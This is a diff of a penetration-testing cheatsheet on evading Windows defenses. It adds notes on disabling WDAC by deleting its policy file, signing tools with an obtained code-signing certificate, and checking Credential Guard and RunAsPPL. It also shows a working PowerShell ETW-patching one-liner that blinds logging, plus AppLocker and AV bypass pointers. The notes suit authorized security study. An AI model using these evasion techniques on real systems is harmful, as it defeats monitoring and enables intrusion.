@@ -12,7 +12,9 @@
    * [Just Enough Admin](#Just-Enough-Admin)
 * [Applocker](#Applocker)
 * [WDAC](#WDAC)
+  * [Code signing](#Code-signing) 
 * [LOLBAS](#LOLBAS)
+* [LSASS Protections](#LSASS-Protections)
 * [Defeating AV](#Defeating-AV)
   * [Obfuscation tools](#Obfuscation-tools)
   * [Evasion techniques](#Evasion-techniques)
@@ -203,6 +205,7 @@ $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0
 - Event Tracing for Windows
 - Very effective way of hunting .NET
 - Reflectivly modify the PowerShell process to prevent events being published. ETW feeds ALL of the other logs so this disabled everything!
+- Also bypasses scriptblock logging
 
 ```
 [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static'); $EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid()); $EtwProvider.SetValue($null, $EventProvider);
@@ -404,13 +407,13 @@ Get-PSSessionConfiguration
 ```
 
 ## Applocker
-- AppLocker rules are split into 5 categories - Executable, Windows Installer, Script, Packaged App and DLLs, and each category can have its own enforcement (enforced, audit only, none).
-- AppLocker has a set of default allow rules such as, "allow everyone to execute anything within C:\Windows\*" - the theory being that everything in C:\Windows is trusted and safe to execute.
+- AppLocker rules are split into 5 categories - `Executable`, `Windows Installer`, `Script`, `Packaged App` and `DLLs`, and each category can have its own enforcement (enforced, audit only, none).
+- AppLocker has a set of default allow rules such as, `allow everyone to execute anything within C:\Windows\*` - the theory being that everything in `C:\Windows` is trusted and safe to execute.
 - The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:
   - Executing untrusted code via trusts LOLBAS's.
   - Finding writeable directories within "trusted" paths.
   - By default, AppLocker is not even applied to Administrators.
-- Uploading into ```C:\Windows``` requires elevated privileges, but there are places like ```C:\Windows\Tasks``` that are writeable by standard users. 
+- Uploading into `C:\Windows` requires elevated privileges, but there are places like `C:\Windows\Tasks` that are writeable by standard users. 
 - DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.
 - Good repo for bypasses: https://github.com/api0cradle/UltimateAppLockerByPassList
 
@@ -450,9 +453,9 @@ runas /netonly /user:<DOMAIN\<USER> cmd.exe
 winrs -r:<PC NAME> cmd
 ```
 
-#### Check for the policy on idsk
-- ```.p7b``` is a signed policy
-- Check if there are any ```.xml``` files which didn't got removed with the policy
+#### Check for the policy on disk
+- `.p7b` is a signed policy
+- Check if there are any `.xml` files which didn't got removed with the policy
 ```
 ls C:\Windows\system32\CodeIntegrity
 ```
@@ -460,9 +463,48 @@ ls C:\Windows\system32\CodeIntegrity
 ### WDAC
 - Tool to bypass: https://github.com/nettitude/Aladdin
 
+### Disable WDAC
+- Policy in `C:\Windows\System32\CodeIntegrity\` in a `.p7b` file. Delete the file and reboot to delete policy.
+- Only works if WDAC isn't enforced through GPO but setup locally!
+
 #### Check for WDAC
 ```
 Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+```
+
+#### Check for the policy on disk
+- `.p7b` is a signed policy
+- Check if there are any `.xml` files which didn't got removed with the policy
+```
+ls C:\Windows\system32\CodeIntegrity
+```
+
+### Code signing
+- Code signing ensures that files weren't tampered with and are verified by a trusted authority.
+- ADCS code signing EKU = `Code Signing` (`1.3.6.1.5.5.7.3.3`)
+- Requires Code Signing cert to be extracted from a system, or created through ADCS and it should be allowed in the WDAC policy!
+
+#### Convert Pem to PFX with openssl
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Check .pfx file for code signing EKU
+-  `Code Signing 1.3.6.1.5.5.7.3.3`
+-  `Cert Hash(sha1)` to validate cert hash
+```
+certutil -v -dump -p "<PASSWORD>" <PATH TO PFX>
+```
+
+#### Sign a tool
+- https://learn.microsoft.com/en-us/dotnet/framework/tools/signtool-exe
+```
+.\signtool.exe sign /fd SHA256 /a /f <PATH TO PFX FILE> /p '<PASSWORD>' <EXE TO SIGN>
+```
+
+#### Get Signer Certificate of tool
+```
+Get-AuthenticodeSignature -FilePath <PATH TO EXE>
 ```
 
 ### LOLBAS
@@ -624,7 +666,31 @@ msbuild.exe <FILE>
 </Project>
 ```
 
+## LSASS Protections
+### Credential Guard
+#### Check if credential guard is configured
+```
+if ((Get-ComputerInfo).DeviceGuardSecurityServicesConfigured -match "CredentialGuardA") {return $true}else{return $false}
+```
+
+#### Check if credential guard is running
+```
+if ((Get-ComputerInfo).DeviceGuardSecurityServicesRunning -match "CredentialGuardA") {return $true}else{return $false}
+```
+
+### RunasPPL
+- https://itm4n.github.io/lsass-runasppl/
+
+#### Check if RunasPPL is configured
+```
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL
+```
+
 ## Defeating AV
+### General
+- EDR Hookdump https://github.com/zeroperil/HookDump
+- Overview of methods: https://github.com/CMEPW/BypassAV
+
 ### Obfuscation tools
 #### C# binaries
 - Obfuscate C# binary with https://github.com/mkaring/ConfuserEx
